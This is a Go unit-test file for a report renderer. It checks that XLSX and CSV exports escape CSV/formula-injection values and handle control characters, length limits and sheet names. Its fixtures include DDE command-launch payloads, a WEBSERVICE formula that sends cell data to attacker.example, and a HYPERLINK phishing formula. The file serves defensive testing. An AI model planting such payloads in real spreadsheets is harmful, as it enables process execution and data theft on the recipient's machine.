package render

import (
	"archive/zip"
	"bytes"
	"io"
	"strings"
	"testing"

	"github.com/xuri/excelize/v2"

	"github.com/encorebom/encorebom/libs/go-shared/platform/errs"
)

// ddePayload is the canonical formula-injection payload: opening a workbook
// whose cell begins with this launches a process.
const ddePayload = `=cmd|'/c calc'!A1`

// TestFormulaInjectionSurvivesTheWriter is the test the guard exists for.
//
// ⚠ IT CHECKS THE FILE, NOT THE FUNCTION. safe.Cell has its own unit tests; the
// failure this one catches is different and more likely — a writer that
// bypasses the escaping, or a library that unescapes on the way out. So the
// workbook is written, read back from the bytes, and the STORED cell is
// inspected.
func TestFormulaInjectionSurvivesTheWriter(t *testing.T) {
	payloads := []struct {
		name  string
		value string
	}{
		{"DDE process launch", ddePayload},
		{"plus-prefixed DDE", `+cmd|'/c calc'!A1`},
		{"minus-prefixed formula", `-1+1+cmd|'/c calc'!A1`},
		{"at-prefixed function", `@SUM(1+9)*cmd|'/c calc'!A1`},
		{"WEBSERVICE exfiltration", `=WEBSERVICE("http://attacker.example/?d="&A1)`},
		{"HYPERLINK phishing", `=HYPERLINK("http://attacker.example","Click for report")`},
		{"tab parse shift", "\t=1+1"},
		{"carriage-return parse shift", "\r=1+1"},
	}

	for _, p := range payloads {
		t.Run(p.name, func(t *testing.T) {
			var buf bytes.Buffer
			result, err := WriteXLSX(&buf, []Sheet{{
				Name:   "Components",
				Header: []string{"Component Name"},
				Rows:   StaticRows([][]string{{p.value}}),
			}})
			if err != nil {
				t.Fatalf("writing: %v", err)
			}

			got := readCell(t, buf.Bytes(), "Components", "A2")
			if !strings.HasPrefix(got, "'") {
				t.Fatalf("the stored cell is not escaped.\n"+
					"  stored: %q\n"+
					"  A cell beginning %q is executed by the importer. The value "+
					"reached the sheet without passing through cell().",
					got, p.value[:1])
			}
			if got != "'"+p.value {
				t.Fatalf("the value was altered beyond the escape prefix:\n  want %q\n  got  %q",
					"'"+p.value, got)
			}
			if n := result.Total(func(s SheetResult) int { return s.Escaped }); n != 1 {
				t.Errorf("Escaped = %d, want 1 — the writer must report that it "+
					"defused something, so a security team learns their dependency "+
					"tree contains a name shaped like an attack", n)
			}
		})
	}
}

// TestNoCellIsWrittenAsAFormula is the structural half of the defence.
//
// The escaping makes the text harmless to anything that re-parses it. This
// asserts the other half: the workbook contains no formula cells at all, so
// Excel never parses these values in the first place. Checked against the sheet
// XML rather than through the library, because the library is what would be
// wrong.
func TestNoCellIsWrittenAsAFormula(t *testing.T) {
	var buf bytes.Buffer
	_, err := WriteXLSX(&buf, []Sheet{{
		Name:   "Components",
		Header: []string{"Component Name", "Version"},
		Rows: StaticRows([][]string{
			{ddePayload, "1.0.0"},
			{"lodash", "=1+1"},
		}),
	}})
	if err != nil {
		t.Fatalf("writing: %v", err)
	}

	for name, content := range worksheetXML(t, buf.Bytes()) {
		if strings.Contains(content, "<f>") || strings.Contains(content, "<f ") {
			t.Fatalf("%s contains a formula element. Every value in a BOM is text; "+
				"a formula cell means something handed excelize a typed value or an "+
				"excelize.Cell{Formula: ...}", name)
		}
	}
}

// TestTheHeaderIsEscapedToo pins the decision not to exempt headers.
//
// Headers are ours, so nothing in them should ever be dangerous — which is
// exactly why exempting them is wrong. An exemption is a second path into a
// cell, and the next person who needs one will use it for data that is not ours.
func TestTheHeaderIsEscapedToo(t *testing.T) {
	var buf bytes.Buffer
	if _, err := WriteXLSX(&buf, []Sheet{{
		Name:   "Components",
		Header: []string{ddePayload},
		Rows:   StaticRows([][]string{{"lodash"}}),
	}}); err != nil {
		t.Fatalf("writing: %v", err)
	}

	if got := readCell(t, buf.Bytes(), "Components", "A1"); !strings.HasPrefix(got, "'") {
		t.Fatalf("the header cell is not escaped: %q", got)
	}
}

// TestControlCharactersDoNotCorruptTheWorkbook covers the same class as the
// normalizer's NUL-byte handling at the Postgres boundary.
//
// XLSX is zipped XML. A NUL or a stray 0x01 in a package name — which a hostile
// package can absolutely have — is not representable in XML 1.0, and a workbook
// containing one is reported by Excel as corrupt: the whole report is lost, not
// one cell.
func TestControlCharactersDoNotCorruptTheWorkbook(t *testing.T) {
	hostile := "lo\x00da\x01sh"

	var buf bytes.Buffer
	result, err := WriteXLSX(&buf, []Sheet{{
		Name:   "Components",
		Header: []string{"Component Name"},
		Rows:   StaticRows([][]string{{hostile}}),
	}})
	if err != nil {
		t.Fatalf("writing: %v", err)
	}

	got := readCell(t, buf.Bytes(), "Components", "A2")
	if strings.ContainsAny(got, "\x00\x01") {
		t.Fatalf("a control character reached the sheet: %q", got)
	}
	// ⚠ REPLACED, NOT DELETED. Deleting would turn this name into "lodash" —
	// a real package it is not. Two names that differ only by an invisible
	// character must not collapse into one.
	if got == "lodash" {
		t.Fatalf("the control characters were deleted, turning a tampered name into " +
			"a legitimate one. They must be replaced, not removed.")
	}
	if n := result.Total(func(s SheetResult) int { return s.ControlStripped }); n != 1 {
		t.Errorf("ControlStripped = %d, want 1", n)
	}
}

// TestAnOverlongValueIsTruncatedVisiblyAndReported covers a hard format limit.
//
// A cell holds 32,767 characters. Exceeding it produces a file Excel refuses to
// open, so the value is cut — and the cut is marked, because a silently
// shortened dependency list reads as a complete one.
func TestAnOverlongValueIsTruncatedVisiblyAndReported(t *testing.T) {
	long := strings.Repeat("a", maxCellRunes+500)

	var buf bytes.Buffer
	result, err := WriteXLSX(&buf, []Sheet{{
		Name:   "Components",
		Header: []string{"Component Description"},
		Rows:   StaticRows([][]string{{long}}),
	}})
	if err != nil {
		t.Fatalf("writing: %v", err)
	}

	got := readCell(t, buf.Bytes(), "Components", "A2")
	if len([]rune(got)) > maxCellRunes {
		t.Fatalf("the cell holds %d characters; the limit is %d",
			len([]rune(got)), maxCellRunes)
	}
	if !strings.HasSuffix(got, truncationMarker) {
		t.Fatalf("truncation is invisible — the value ends %q", tail(got, 20))
	}
	if n := result.Total(func(s SheetResult) int { return s.Truncated }); n != 1 {
		t.Errorf("Truncated = %d, want 1 — data loss must be counted and reported", n)
	}
}

// TestTooManyRowsIsRefusedWithACode covers Excel's worksheet row limit.
//
// The remedy differs from the PDF cap, so the code does too: a PDF that is too
// long is narrowed to Top-Level, whereas a sheet that is too tall has to become
// JSON. Silently writing 1,048,576 rows and dropping the rest would produce a
// BOM that looks complete and is not.
func TestTooManyRowsIsRefusedWithACode(t *testing.T) {
	original := rowLimit
	rowLimit = 5
	t.Cleanup(func() { rowLimit = original })

	rows := make([][]string, 20)
	for i := range rows {
		rows[i] = []string{"component"}
	}

	var buf bytes.Buffer
	_, err := WriteXLSX(&buf, []Sheet{{
		Name:   "Components",
		Header: []string{"Component Name"},
		Rows:   StaticRows(rows),
	}})
	if err == nil {
		t.Fatal("a sheet exceeding the row limit was written without complaint")
	}
	if !errs.Is(err, errs.ReportTooLargeForXLSX) {
		t.Fatalf("error code = %v, want %v", errs.From(err).Code, errs.ReportTooLargeForXLSX)
	}
}

// TestASourceErrorAbortsTheWorkbook — a report that stops halfway is a report
// with missing components and no way for the reader to tell.
func TestASourceErrorAbortsTheWorkbook(t *testing.T) {
	boom := errs.New(errs.ReportRenderFailed, "the database went away")

	var buf bytes.Buffer
	_, err := WriteXLSX(&buf, []Sheet{{
		Name:   "Components",
		Header: []string{"Component Name"},
		Rows: func(emit func([]string) error) error {
			if err := emit([]string{"lodash"}); err != nil {
				return err
			}
			return boom
		},
	}})
	if err == nil {
		t.Fatal("a failing row source produced a workbook")
	}
	if !errs.Is(err, errs.ReportRenderFailed) {
		t.Fatalf("the cause was lost: %v", err)
	}
}

// TestAnInvalidSheetNameIsRefused — sheet names are ours, so a bad one is a bug
// here. Silently renaming "Engine Coverage" would rename the one section the
// report may not omit.
func TestAnInvalidSheetNameIsRefused(t *testing.T) {
	for _, name := range []string{
		"", "Components/Findings", "Findings[2026]",
		strings.Repeat("x", maxSheetNameRunes+1),
	} {
		var buf bytes.Buffer
		_, err := WriteXLSX(&buf, []Sheet{{Name: name, Header: []string{"a"}, Rows: StaticRows(nil)}})
		if err == nil {
			t.Errorf("sheet name %q was accepted", name)
		}
	}
}

// TestThePlaceholderSheetIsRemoved — excelize starts every workbook with an
// empty "Sheet1", which would otherwise be the first tab a customer opens.
func TestThePlaceholderSheetIsRemoved(t *testing.T) {
	var buf bytes.Buffer
	if _, err := WriteXLSX(&buf, []Sheet{
		{Name: "Summary", Header: []string{"Item"}, Rows: StaticRows([][]string{{"x"}})},
		{Name: "Components", Header: []string{"Component Name"}, Rows: StaticRows(nil)},
	}); err != nil {
		t.Fatalf("writing: %v", err)
	}

	f := open(t, buf.Bytes())
	got := f.GetSheetList()
	want := []string{"Summary", "Components"}
	if len(got) != len(want) {
		t.Fatalf("sheets = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("sheets = %v, want %v (order is the tab order)", got, want)
		}
	}
}

// ─── CSV ────────────────────────────────────────────────────────────────────

// TestFormulaInjectionIsEscapedInCSV — CSV is the sharper half of the problem,
// not the milder one. It carries no cell types at all, so whatever imports it
// decides what each field means, and Excel's decision for a field starting `=`
// is "formula".
func TestFormulaInjectionIsEscapedInCSV(t *testing.T) {
	var buf bytes.Buffer
	result, err := WriteCSV(&buf, Sheet{
		Name:   "Components",
		Header: []string{"Component Name"},
		Rows:   StaticRows([][]string{{ddePayload}}),
	})
	if err != nil {
		t.Fatalf("writing: %v", err)
	}

	out := buf.String()
	if !strings.Contains(out, "'"+ddePayload) {
		t.Fatalf("the payload is unescaped in the CSV:\n%s", out)
	}
	if result.Escaped != 1 {
		t.Errorf("Escaped = %d, want 1", result.Escaped)
	}
}

// TestCSVQuotingAndEscapingAreDifferentProblems.
//
// encoding/csv quotes a field containing a comma; that is syntax. It does
// nothing about what the importer will execute. A correctly quoted
// `"=cmd|'/c calc'!A1"` still runs.
func TestCSVQuotingAndEscapingAreDifferentProblems(t *testing.T) {
	value := `=cmd|'/c calc'!A1,extra`

	var buf bytes.Buffer
	if _, err := WriteCSV(&buf, Sheet{
		Name:   "Components",
		Header: []string{"Component Name"},
		Rows:   StaticRows([][]string{{value}}),
	}); err != nil {
		t.Fatalf("writing: %v", err)
	}

	out := buf.String()
	if !strings.Contains(out, `"'=cmd`) {
		t.Fatalf("want the field both quoted (comma) and escaped (leading =), got:\n%s", out)
	}
	// Double-quoting would corrupt every value containing a comma.
	if strings.Contains(out, `""'=cmd`) {
		t.Fatalf("the field was quoted twice:\n%s", out)
	}
}

// ─── helpers ────────────────────────────────────────────────────────────────

func open(t *testing.T, data []byte) *excelize.File {
	t.Helper()
	f, err := excelize.OpenReader(bytes.NewReader(data))
	if err != nil {
		t.Fatalf("the workbook does not open: %v", err)
	}
	t.Cleanup(func() { _ = f.Close() })
	return f
}

func readCell(t *testing.T, data []byte, sheet, axis string) string {
	t.Helper()
	f := open(t, data)

	if formula, err := f.GetCellFormula(sheet, axis); err == nil && formula != "" {
		t.Fatalf("%s!%s is a FORMULA cell: %q", sheet, axis, formula)
	}
	value, err := f.GetCellValue(sheet, axis, excelize.Options{RawCellValue: true})
	if err != nil {
		t.Fatalf("reading %s!%s: %v", sheet, axis, err)
	}
	return value
}

// worksheetXML returns the raw sheet XML, which is what the library would be
// hiding if it were wrong.
func worksheetXML(t *testing.T, data []byte) map[string]string {
	t.Helper()
	zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatalf("the workbook is not a readable zip: %v", err)
	}

	out := map[string]string{}
	for _, file := range zr.File {
		if !strings.HasPrefix(file.Name, "xl/worksheets/") || !strings.HasSuffix(file.Name, ".xml") {
			continue
		}
		rc, err := file.Open()
		if err != nil {
			t.Fatalf("opening %s: %v", file.Name, err)
		}
		content, err := io.ReadAll(rc)
		_ = rc.Close()
		if err != nil {
			t.Fatalf("reading %s: %v", file.Name, err)
		}
		out[file.Name] = string(content)
	}
	if len(out) == 0 {
		t.Fatal("the workbook contains no worksheets")
	}
	return out
}

func tail(s string, n int) string {
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	return string(r[len(r)-n:])
}
